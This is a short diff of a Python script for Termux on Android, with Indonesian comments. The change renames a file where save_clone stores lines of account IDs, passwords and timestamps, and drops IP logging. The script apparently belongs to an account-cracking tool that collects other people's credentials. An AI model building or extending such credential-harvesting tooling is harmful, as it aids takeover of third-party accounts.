@@ -13,23 +13,18 @@ from io import BytesIO
 BASE_DIR = "/data/data/com.termux/files/home/storage/shared/PARADISE"
 os.makedirs(BASE_DIR, exist_ok=True)
 
+# ==========================
 def save_clone(uid, pw):
     # Ambil tanggal & jam sekarang
     waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Ambil IP HP Kamu
-    try:
-        ip = socket.gethostbyname(socket.gethostname())
-    except:
-        ip = "UNKNOWN_IP"
-        
     # Nama file tetap sama (tidak pakai tanggal)
-    clone_filename = "CLONE.txt"
+    clone_filename = "OLD-FOUNDER-KGF.txt"
     clone_path = os.path.join(BASE_DIR, clone_filename)
 
-    # Simpan: UID|PASS|WAKTU|IP
+    # Simpan data + waktu
     with open(clone_path, "a") as f:
-        f.write(f"{uid}|{pw}|{waktu}|{ip}\n")
+        f.write(f"{uid}|{pw}|{waktu}\n")
 
 try:
     import requests
